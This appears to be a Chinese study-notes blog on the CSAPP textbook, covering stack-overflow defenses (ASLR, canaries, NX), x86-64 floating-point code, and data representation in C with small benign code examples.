<p>程序开始时，在栈上分配一段0~n字节之间的随机大小的空间，例如，使用分配函数<code>alloca</code>在栈上分配指定字节数量的空间。程序不使用这段空间，但是它会导致程序每次执行时后续的栈位置发生了变化。</p>
<p>下面的代码是一种确定<strong>典型的</strong>栈地址的方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> local;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;local at %p\n&quot;</span>, &amp;local);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码只是简单地打印出<code>main</code>中局部变量的地址。在32位<code>linux</code>上运行这段代码10000次，这个地址的变化范围为<code>0xff7fc59c</code>到<code>0xffffd09c</code>,范围大约是2<sup>23</sup>.而64位<code>linux</code>上，范围大小大约是2<sup>32</sup>.</p>
<p>在<code>linux</code>中，栈随机化是更大的一类技术中的一种，这类技术叫做<strong>地址空间布局随机化（ASLR）</strong>。采用ASLR，每次运行时程序的不同部分，包括程序代码、库代码、栈、全局变量和堆数据，都会被加载到内存的不同区域。这就意味着在一台机器上运行一个程序，与在其他机器上运行同样的程序，他们的映射地址大相径庭</p>
<p>然而，一个执著的攻击者总是能够用蛮力克服随机化，他可以反复地用不同的地址进行攻击。一种常见的把戏就是在实际的攻击代码前插入很长一段的 <code>nop</code>(读作 “no op”,<code>no operatioin</code>的缩写）指令。执行这种指令除了对程序计数器加一，使之指向下一条指令之外，没有任何的效果。只要攻击者能够猜中这段序列中的某个地址，程序就会经过这个序列，到达攻击代码。这个序列常用的术语是“空操作雪橇 (<code>nop sled</code>)” , 意思是程序会“滑过“这个序列。如果我们建立一个 256 个字节的 <code>nop sled</code>, 那么枚举 215 &#x3D; 32 768 个起始地址，就能破解n~223的随机化，这对于一个顽固的攻击者来说，是完全可行的。</p>
<ol start="2">
<li><strong>栈破坏检测</strong></li>
</ol>
<p>计算机的第二道防线是能够检测到何时栈已经被破坏。我们看到，破坏通常发生在当超越局部缓冲区的边界时。在 C 语言中，没有可靠的方法来防止对数组的越界写。但是，我们能够在发生了越界写的时候，在造成任何有害结果之前，尝试检测到它。</p>
<img src="./3_images/image-20250121211912073-1737469964589-70.png" alt="image-20250121211912073" style="zoom: 80%;" />

<p>如图所示，在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的canary(金丝雀)，这个值是在程序运行时随机产生的，因此，攻击者没简单的办法能够知道它是什么。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了。如果是的，那么程序异常终止</p>
<p>例如当开启栈溢出保护时，可以得到echo的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">echo:</span><br><span class="line">	subq	$24, %rsp		Allocate 24 bytes on stack</span><br><span class="line">	movq	%fs:40, %rax	Retrieve canary</span><br><span class="line">	movq	%rax, 8(%rsp)	Store on stack</span><br><span class="line">	xorl	%eax, %eax		Zero out register</span><br><span class="line">	movq	%rsp, %rdi		Compute buf as %rsp</span><br><span class="line">	call	gets			Call gets</span><br><span class="line">	movq	%rsp, %rdi		Compute buf as %rsp</span><br><span class="line">	call	puts			Call puts</span><br><span class="line">	movq	8(%rsp), %rax	Retrive canary</span><br><span class="line">	xorq	%fs:40, %rax	Compare to stored value</span><br><span class="line">	je		.L9				if =, goto ok</span><br><span class="line">	call	__stack_chk_fail</span><br><span class="line">.L9:</span><br><span class="line">	addq	$24, %rsp		Deallocate stack space</span><br><span class="line">	ret						Return </span><br></pre></td></tr></table></figure>

<p>这个版本的函数从内存中读出一个值（第3行），再把它存放在栈中相对于<code>%rsp</code>偏移量为8的地方。指令参数<code>%fs:40</code>指明金丝雀值使用<em>段寻址</em>从内存中读入的，段寻址可以追溯到80286的寻址，而在现代系统上运行的程序已经很少见到了。将金丝雀放在一个特殊的段中，标记为“只读“。</p>
<ol start="3">
<li><strong>限制可执行代码区域</strong></li>
</ol>
<p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p>
<p>在典型的程序中，只有保存编译器产生的代码的那部分内存才需要是可执行的。其他部分可以被限制为只允许读和写。正如第 9 章中会看到的，虚拟内存空间在逻辑上被分成了页 (page), 典型的每页是 2048 或者 4096 个字节。硬件支持多种形式的内存保护，能够指明用户程序和操作系统内核所允许的访问形式。许多系统允许控制 三 种访问形式：读（从内存读数据）、写（存储数据到内存）和执行（将内存的内容看作机器级代码）。</p>
<p>以前， x86 体系结构将读和执行访问控制合并成一个 1 位的标志，这样任何被标记为可读的页也都是可执行的。栈必须是既可读又可写的，因而栈上的字节也都是可执行的。已经实现的很多机制，能够限制一些页是可读但是不可执行的，然而这些机制通常会带来严重的性能损失。</p>
<p>最近， AMD 为它的 64 位处理器的内存保护引入了 “NX” (No-Execute, 不执行）位，将读和执行访问模式分开， Intel 也跟进了。有了这个特性，栈可以被标记为可读和可写，但是不可执行，而检查页是否可执行由硬件来完成，效率上没有损失。</p>
<p>有些类型的程序要求动态产生和执行代码的能力。例如，”即时 (just-in-time)” 编译技术为解释语言（例如 Java) 编写的程序动态地产生代码，以提高执行性能。是否能够将可执行代码限制在由编译器在创建原始程序时产生的那个部分中，取决千语言和操作系统。</p>
<h3 id="3-10-5-支持变长栈帧"><a href="#3-10-5-支持变长栈帧" class="headerlink" title="3.10.5 支持变长栈帧"></a>3.10.5 支持变长栈帧</h3><p>目前为止，我们检查的各种函数的机器级代码都有一个共同点：编译器能够预先确定需要为栈帧分配多少空间。</p>
<p>但是有些函数需要的局部存储是变长的。例如，当函数调用<code>alloca</code>时就会发生这种情况，该函数可以在栈上分配任意字节数量的存储。当代码声明一个局部变长数组的时候，也会发生这种情况</p>
<p>为了管理变长栈帧，x86-64代码使用寄存器<code>%rbp</code>作为<em>帧指针（基指针）</em>，</p>
<img src="./3_images/image-20250121215137836-1737469964589-71.png" alt="image-20250121215137836" style="zoom:67%;" />

<p>可以看到代码必须把<code>%rbp</code>之前的值保存到栈中，因为它时一个被调用者保存寄存器。然后在函数的整个执行过程中，都使得<code>%rbp</code>指向那个时刻栈的位置，然后用固定长度的局部变量（例如i）相对于<code>%rbp</code>的偏移量来引用它们</p>
<h2 id="3-11-浮点代码"><a href="#3-11-浮点代码" class="headerlink" title="3.11 浮点代码"></a>3.11 浮点代码</h2><p>处理器的<em>浮点体系结构</em>包括多个方面，会影响浮点数操作的程序如何被映射到机器上，包括：</p>
<ul>
<li>如何存储和访问浮点数值。通常时通过某种寄存器方式完成</li>
<li>对浮点数据操作的指令</li>
<li>对函数传递浮点数参数和从函数返回浮点数结果的规则</li>
<li>函数调用过程中保存寄存器的规则——例如，一些寄存器被指定为调用者保存，而其他的被指定为被调用者保存</li>
</ul>
<p>MM 寄存器是 64 位的，XMM 是 128 位的，而 YMM 是 256 位的。所以，每个 YMM 寄存器可以存放 8 个 32 位值，或 4 个 64 位值，这些值可以是整数，也可以是浮点数。</p>
<p>x86-64 浮点数是基于 SSE 或 AVX 的，包括传递过程参数和返回值的规则。</p>
<p><strong>书本中的讲述基于 AVX2</strong>，即 AVX 的第二个版本。</p>
<p>和整数操作一样，注意书本表述中使用的 ATT 格式不同于文档中使用的 Intel 格式。特别地，<strong>这两种版本中列出指令操作数的顺序是不同的</strong>。</p>
<p>如图 3-45 所示，AVX 浮点体系结构允许数据存储在 16 个 YMM 寄存器中，它们的名字为 <code>%ymm0 ~ %ymm15</code>，每个 YMM 寄存器都是 256 位（32 字节）。当对标量数据操作时，这些寄存器只保存浮点数，而且只使用低 32 位（对于 <code>float</code>）或 64 位（对于 <code>double</code>）。汇编代码用寄存器的 SSE XMM 寄存器名字 <code>%xmm0 ~ %xmm15</code> 来引用它们，每个 XMM 寄存器都是对应的 YMM 寄存器的低 128 位（16 字节）。</p>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918102123978-1737469964589-72.png" alt="image-20220918102123978"></th>
</tr>
</thead>
<tbody><tr>
<td>图3-45 媒体寄存器</td>
</tr>
</tbody></table>
<h3 id="3-11-1-浮点数传送和转换操作"><a href="#3-11-1-浮点数传送和转换操作" class="headerlink" title="3.11.1 浮点数传送和转换操作"></a>3.11.1 浮点数传送和转换操作</h3><p>图 3-46 给出了一组在内存和 XMM 寄存器之间以及从一个 XMM 寄存器到另一个不做任何转换的传送浮点数的指令。数据要么保存在内存中（由表中的 <code>M32</code> 和 <code>M64</code> 指明），要么保存在 XMM 寄存器中（在表中用 X 表示）。无论数据对齐与否，这些指令都能正确执行，不过代码优化规则建议 32 位内存数据满足 4 字节对齐，64 位数据满足 8 字节对齐。</p>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918134521063-1737469964589-73.png" alt="image-20220918134521063"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-46 浮点传送指令，这些操作在内存和寄存器之间以及一对寄存器之间传送值</td>
</tr>
</tbody></table>
<p>上图中，指令名字中的字母 <code>a</code> 表示 <code>aligned</code>（对齐的）。当用于读写内存时，如果地址不满足 16 字节对齐，它们会导致异常。在两个寄存器之间传送数据，绝不会出现错误对齐的状况。</p>
<p>图 3-47 和图 3-48 给出了在浮点数和整数数据类型之间以及不同浮点格式之间进行转换的指令集合。</p>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918135412001-1737469964589-74.png" alt="image-20220918135412001"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-47 双操作数浮点转换指令，这些操作将浮点数转换成整数</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918135555937-1737469964589-75.png" alt="image-20220918135555937"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-48 三操作数浮点转换指令，将第一个源的数据类型转换成目的的数据类型，第二个源值对结果的低位字节没有影响</td>
</tr>
</tbody></table>
<h3 id="3-11-2-过程中的浮点代码"><a href="#3-11-2-过程中的浮点代码" class="headerlink" title="3.11.2 过程中的浮点代码"></a>3.11.2 过程中的浮点代码</h3><p>当函数包含指针、整数和浮点数混合的参数时，指针和整数通过通用寄存器传递，而浮点值通过 XMM 寄存器传递。也就是说，参数到寄存器的映射取决于它们的类型和排列的顺序。</p>
<p>下面是一些例子：</p>
<ul>
<li><p><code>double f1(int x, double y, long z);</code></p>
<p>这个函数会把 <code>x</code> 存放在 <code>%rdi</code> 中，<code>y</code> 存放在 <code>%xmm0</code> 中，而 <code>z</code> 存放在 <code>%rsi</code> 中。</p>
</li>
<li><p><code>double f2(double y, int x, long z);</code></p>
<p>这个函数的寄存器分配与函数 <code>f1</code> 相同。</p>
</li>
<li><p><code>double f1(float x, double *y, long *z);</code></p>
<p>这个函数会将 <code>x</code> 放在 <code>%xmm0</code> 中，<code>y</code> 放在 <code>%rdi</code> 中，而 <code>z</code> 放在 <code>%rsi</code> 中。</p>
</li>
</ul>
<h3 id="3-11-3-浮点运算操作"><a href="#3-11-3-浮点运算操作" class="headerlink" title="3.11.3 浮点运算操作"></a>3.11.3 浮点运算操作</h3><p>图 3-49 描述了一组执行算术运算的标量 AVX2 浮点指令。每条指令有一个或两个源操作数 <code>S1</code> 或 <code>S2</code>，和一个目的操作数 <code>D</code>。第一个源操作数 <code>S1</code> 可以是一个 XMM 寄存器或一个内存位置，第二个源操作数以及目的操作数都必须是 XMM 寄存器。结果存放在目的寄存器。</p>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918142347207-1737469964589-76.png" alt="image-20220918142347207"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-49 标量浮点算术运算</td>
</tr>
</tbody></table>
<h3 id="3-11-4-定义和使用浮点常数"><a href="#3-11-4-定义和使用浮点常数" class="headerlink" title="3.11.4 定义和使用浮点常数"></a>3.11.4 定义和使用浮点常数</h3><p>和整数运算操作不同，AVX 浮点操作不能以立即数值作为操作数。相反，编译器必须为所有的常量值分配和初始化存储空间，然后代码在把这些值从内存读入。</p>
<h3 id="3-11-5-在浮点代码中使用位级操作"><a href="#3-11-5-在浮点代码中使用位级操作" class="headerlink" title="3.11.5 在浮点代码中使用位级操作"></a>3.11.5 在浮点代码中使用位级操作</h3><p>图 3-50 展示了一些指令，这些操作都作用于封装好的数据，即它们更新整个目的 XMM 寄存器，对两个源寄存器的所有位都实施指定的位级操作。</p>
<table>
<thead>
<tr>
<th><img src="/./3_images/image-20220918163057750-1737469964589-77.png" alt="image-20220918163057750"></th>
</tr>
</thead>
<tbody><tr>
<td>图 3-50 对封装数据的位级操作</td>
</tr>
</tbody></table>
<p>上图中的这些指令对一个 XMM 寄存器中的所有 128 位进行布尔操作。</p>
<h3 id="3-11-6-浮点比较操作"><a href="#3-11-6-浮点比较操作" class="headerlink" title="3.11.6 浮点比较操作"></a>3.11.6 浮点比较操作</h3><p>AVX2 提供了两条用于比较浮点数值的指令：</p>
<p><img src="/./3_images/image-20220918163949044-1737469964589-78.png" alt="image-20220918163949044"></p>
<p>参数 <code>S2</code> 必须在 XMM 寄存器中，而 <code>S1</code> 可以在 XMM 寄存器中，也可以在内存中。</p>
<p>浮点比较指令会设置三个条件码：零标志位 <code>ZF</code>、进位标志位 <code>CF</code> 和奇偶标志位 <code>PF</code>。条件码的设置条件如下：</p>
<p><img src="/./3_images/image-20220918164412114-1737469964589-79.png" alt="image-20220918164412114"></p>
<p>当任一操作数为 <code>NaN</code> 时，就会出现无序的情况。</p>
<h3 id="3-11-7-对浮点代码的观察结论"><a href="#3-11-7-对浮点代码的观察结论" class="headerlink" title="3.11.7 对浮点代码的观察结论"></a>3.11.7 对浮点代码的观察结论</h3><p>可以看到，用AVX2为浮点数上的操作产生的机器代码风格类似于为整数上的操作产生的代码风格。它们都使用一组寄存器来保存和操作数据值，也都使用这些寄存器来传递函数参数</p>
<p>处理不同的数据类型以及对包含混合数据类型的表达式求值的规则有许多复杂之处，同时AVX2代码包括许多比只执行整数运算的函数更加不同的指令和格式。AVX2还有能力在封装好的数据上执行并行操作，使计算执行的更快。</p>
<h2 id="3-12-小结"><a href="#3-12-小结" class="headerlink" title="3.12 小结"></a>3.12 小结</h2><p>本章我们了解了什么</p>
<ul>
<li><p>C语言提供的抽象层下面的东西，以了解机器编程</p>
</li>
<li><p>过让编译器产生机器级程序的汇编代码表示，我们了解了编译器和它的优化能力，以及机器、数据类型和指令集</p>
<ul>
<li>在第5章，我们会看到，当编写能有效映射到机器上的程序时，了解编译器的特性会有所帮助</li>
</ul>
</li>
<li><p>我们还更完整地了解了程序如何将数据存储在不同的内存区域中</p>
<ul>
<li>在第12章会看到许多这样的例子，应用程序员需要知道一个程序变量是在运行时栈中，是在某个动态分配的数据结构中，还是全局程序数据的一部分</li>
<li>理解程序如何映射到机器上，会让理解这些存储类型之间的区别容易一些</li>
</ul>
</li>
<li><p>机器级程序和它们的汇编代码表示，与C程序的差别很大；各种数据类型之间的差别很小。程序是以指令序列来表示的，每条指令都完成一个单独的操作</p>
</li>
<li><p>编译器必须使用多条指令来产生和操作各种数据结构，以及实现像条件、循环和过程这样的控制结构</p>
</li>
<li><p>我们看到C语言中缺乏边界检查，使得许多程序容易出现缓冲区溢出</p>
</li>
</ul>
<blockquote>
<p>我们只分析了C到x86-64的映射，但是大多数内容对其他语言和机器组合来说也是类似的。例如，编译C++与编译C就非常相似。实际上，C++的早期实现就只是简单地执行了从C++到C的源到源的转换，并对结果运行C编译器，产生目标代码。C++的对象用结构来表示，类似千C的struct。C++的方法是用指向实现方法的代码的指针来表示的。相比而言，Java的实现方式完全不同。Java的目标代码是一种特殊的二进制表示，称为Java宇节代码。这种代码可以看成是虚拟机的机器级程序。正如它的名字暗示的那样，这种机器并不是直接用硬件实现的，而是用软件解释器处理字节代码，模拟虚拟机的行为。另外，有一种称为及时编译的方法，动态地将字节代码序列翻译成机器指令。当代码要执行多次时（例如在循环中），这种方法执行起来更快。用字节代码作为程序的低级表示，优点是相同的代码可以在许多不同的机器上执行，而在本章谈到的机器代码只能在x86-64机器上运行</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/csapp/2/2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/csapp/2/2/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-01-17 22:49:47" itemprop="dateModified" datetime="2025-01-17T22:49:47+08:00">2025-01-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="2-信息的表示和处理"><a href="#2-信息的表示和处理" class="headerlink" title="2 信息的表示和处理"></a>2 信息的表示和处理</h1><h2 id="2-1-信息存储"><a href="#2-1-信息存储" class="headerlink" title="2.1 信息存储"></a>2.1 信息存储</h2><h3 id="2-1-2-字数据大小"><a href="#2-1-2-字数据大小" class="headerlink" title="2.1.2 字数据大小"></a>2.1.2 字数据大小</h3><p>可以在计算机上通过 <strong>-m32</strong> 编译，编译后可以在32和64位计算机上运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; gcc -m32 prog.c</span><br></pre></td></tr></table></figure>

<p>为了避免以来“典型”大小不同C99引入了新的数据类型，数据大小固定<code>int32_t</code>和<code>int64_t</code>，分别为4字节和8字节</p>
<h3 id="2-1-3-寻址和字节顺序"><a href="#2-1-3-寻址和字节顺序" class="headerlink" title="2.1.3 寻址和字节顺序"></a>2.1.3 寻址和字节顺序</h3><p><strong>小端序</strong> 在内存中按照从最低有效字节到最高有效字节的顺序存储对象</p>
<table>
<thead>
<tr>
<th align="center">0x100</th>
<th align="center">0x101</th>
<th align="center">0x102</th>
<th align="center">0x103</th>
</tr>
</thead>
<tbody><tr>
<td align="center">67</td>
<td align="center">45</td>
<td align="center">23</td>
<td align="center">01</td>
</tr>
</tbody></table>
<p><strong>大端序</strong> 在内存中按照从最高有效字节到最低有效字节的顺序存储对象</p>
<table>
<thead>
<tr>
<th align="center">0x100</th>
<th align="center">0x101</th>
<th align="center">0x102</th>
<th align="center">0x103</th>
</tr>
</thead>
<tbody><tr>
<td align="center">01</td>
<td align="center">23</td>
<td align="center">45</td>
<td align="center">67</td>
</tr>
</tbody></table>
<p><em>对于0x1234567的int型数值的存储</em></p>
<p>字节顺序比较重要的情况会出现在编写规避正常的类型系统的程序时，尤其在c语言中，可以通过强制类型转化（cast）或联合（union）来允许以一种数据欸行引用一个对象，这在系统级编程中有用甚至必需</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> * byte_pointer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_bytes</span><span class="params">(byte_pointer start,<span class="type">size_t</span> len)</span><span class="comment">//输入为一个字节序列的地址，它用一个字节指针和一个字节数来表示</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> i;<span class="comment">//size_t表示数据结构大小的首选数据类型</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2x&quot;</span>,start[i]);<span class="comment">//打印出每个以16进制表示的字节</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_int</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    show_bytes((byte_pointer) &amp;x,<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_float</span><span class="params">(<span class="type">float</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    show_bytes((byte_pointer) &amp;x,<span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_pointer</span><span class="params">(<span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">    show_bytes((byte_pointer) &amp;x,<span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印程序对象的字节表示，这段代码使用强制类型转换来规避类型系统，很容易定义针对其他数据类型的类似函数</span></span><br></pre></td></tr></table></figure>

<p>这些函数传递给show_bytes一个指向它们参数x的指针&amp;x,且这个指针被强制类型转换为<code>unsigned char *</code></p>
<p>这种强制类型转换告诉编译器，程序应该把这个指针看成指向一个字节序列，而不是一个指向一个原始数据类型的对象，然后这个指针会被看成是对象使用的最低字节地址</p>
<p><img src="/image.png" alt="alt text"></p>
<p><em>结果如上</em></p>
<h3 id="2-1-4-表示字符串"><a href="#2-1-4-表示字符串" class="headerlink" title="2.1.4 表示字符串"></a>2.1.4 表示字符串</h3><p>十进制数字x的ASCLL码正好是0x3x,终止字节的十六进制表示为0x00</p>
<p>在使用ASCLL码作为字符的任何系统上都将得到相同结果，与字节顺序和字大小规则无关</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *s = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line">show_bytes((byte_pointer) s,<span class="built_in">strlen</span>(s));</span><br></pre></td></tr></table></figure>

<p>输出结果为<code>61 62 63 64 65 66</code>,需要注意strlen不计数结束符</p>
<h3 id="2-1-6-布尔代数简介"><a href="#2-1-6-布尔代数简介" class="headerlink" title="2.1.6 布尔代数简介"></a>2.1.6 布尔代数简介</h3><p><strong>位向量</strong> 固定长度为w、由0和1组成的串，而位向量的运算可以定义为参数的每个对应元素之间的运算<br>    二进制数的每一位可以对应集合中的一个元素，如果该位为1，则表示该元素在集合中存在；如果该位为0，则表示该元素不存在<br>    a&#x3D;[01101001]表示集合A&#x3D;{0.3.5.6}     b&#x3D;[01010101]表示集合B&#x3D;{0.2.4.6}<br>    使用编码集合的方法，<code>|</code>和<code>&amp;</code>表示集合的并和交，~表示集合的补<br>    例如：a&amp;b&#x3D;[01000001]，而A交B&#x3D;{0.6}</p>
<h3 id="2-1-7-c语言中的位级运算"><a href="#2-1-7-c语言中的位级运算" class="headerlink" title="2.1.7 c语言中的位级运算"></a>2.1.7 c语言中的位级运算</h3><p><strong>掩码</strong> 一个位模式，表示从一个字中选出的位的集合<br>    掩码0xFF(最低的8位为1)表示一个字的低位字节，位级运算x&amp;0xFF生成一个由x的最低有效字节组成的值，而其他的字节被置为0<br>    比如若x &#x3D; 0x89ABCDEF,最终表达式将得到0x000000EF.</p>
<h3 id="2-1-8-c语言中的逻辑运算符"><a href="#2-1-8-c语言中的逻辑运算符" class="headerlink" title="2.1.8 c语言中的逻辑运算符"></a>2.1.8 c语言中的逻辑运算符</h3><p>&amp;&amp;和||如果第一个参数求值就可以确定表达式的结果，那么逻辑运算符就不会对第二个参数求值</p>
<p><code>a&amp;&amp;5/a</code>不会导致被0除,<code>p&amp;&amp;*p++</code>不会导致间接引用空指针</p>
<h3 id="2-1-9-c语言中的移位运算"><a href="#2-1-9-c语言中的移位运算" class="headerlink" title="2.1.9 c语言中的移位运算"></a>2.1.9 c语言中的移位运算</h3><p><code>x&lt;&lt;k</code>意为x向左移动k位，丢弃最高的k位，并在右端补k个0<br><code>x&gt;&gt;k</code>意为向右移动k位，但是存在两种移位模式：逻辑右移，算术右移<br>    <strong>逻辑右移</strong>：在左端补k个0<br>    <strong>算数右移</strong>：取决于最高位是0&#x2F;1，补齐最高位的数字<br>        所有有符号数都是算数右移，无符号数都是逻辑右移<br><em>若移动的k很大，会移动 k mod w</em></p>
<h2 id="2-2-整数表示"><a href="#2-2-整数表示" class="headerlink" title="2.2 整数表示"></a>2.2 整数表示</h2><h3 id="2-2-3-补码编码"><a href="#2-2-3-补码编码" class="headerlink" title="2.2.3 补码编码"></a>2.2.3 补码编码</h3><p>注意-1和UMax有同样的位表示——一个全1的串</p>
<h4 id="stdint-h"><a href="#stdint-h" class="headerlink" title="stdint.h"></a>stdint.h</h4><p>ISO C99标准在这个文件中引入了<code>int64_t</code>和<code>int32_t</code>这个整数类型类</p>
<p>这个文件定义了一组数据类型，声明形如<code>intN_t</code>(有符号N位数据)和<code>uintN_t</code>(无符号N位数据)</p>
<p>这些数据类型对应着一组宏，定义了每个N的值对应的最小和最大值，这些宏的名字形如<code>INTN_MIN</code> <code>INTN_MAX</code> <code>UINTN_MAX</code></p>
<p>确定宽度类型的带个是打印需要用宏，以与系统相关的方式拓展为格式串，举个例子<br>    x、y的类型是int32_t,uint64_t,想要打印他们的值<br>    printf(“x &#x3D; % “ PRId32 “, y &#x3D; % “ PRIu64 “\n”,x,y);<br>    编译为64位程序时，宏 PRId32 展开成字符串“d”，宏字符串 PRId64 展开成字符串 “lu”，当c预处理器遇到仅用空格（或其它空白字符）分隔的一个字符串常量序列时，就把它们串联起来，所以变为了<br>    printf(“x &#x3D; %d,y &#x3D; %lu\n”,x,y);</p>
<h3 id="2-2-4-有符号数和无符号数之间的转换"><a href="#2-2-4-有符号数和无符号数之间的转换" class="headerlink" title="2.2.4 有符号数和无符号数之间的转换"></a>2.2.4 有符号数和无符号数之间的转换</h3><p>C语言支持在各种不同的数字数据类型之间做强制类型转换</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> <span class="type">int</span> v = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> uv = (<span class="type">unsigned</span>) v;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;v = %d,uv = %u\n&quot;</span>,v,uv);</span><br></pre></td></tr></table></figure>

<p>在使用补码的机器上会产生结果：<code>v = -12345,uv = 53191</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> u = <span class="number">4294967295u</span>; <span class="comment">//UMax</span></span><br><span class="line"><span class="type">int</span> tu = (<span class="type">int</span>) u;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;u = %u,tu = %d\n&quot;</span>,u,tu);</span><br></pre></td></tr></table></figure>

<p>在使用补码的机器上会产生结果：<code>u = 429496725,tu = -1</code></p>
<p><strong>可以看到强制转换的结果保持位值不变，只是改变了解释这些位的方式</strong>。</p>
<h3 id="2-2-5-C语言中的有符号数和无符号数"><a href="#2-2-5-C语言中的有符号数和无符号数" class="headerlink" title="2.2.5 C语言中的有符号数和无符号数"></a>2.2.5 C语言中的有符号数和无符号数</h3><p>当一种类型的表达式被赋值给另外一种类型的变量时，转换是隐式发生的</p>
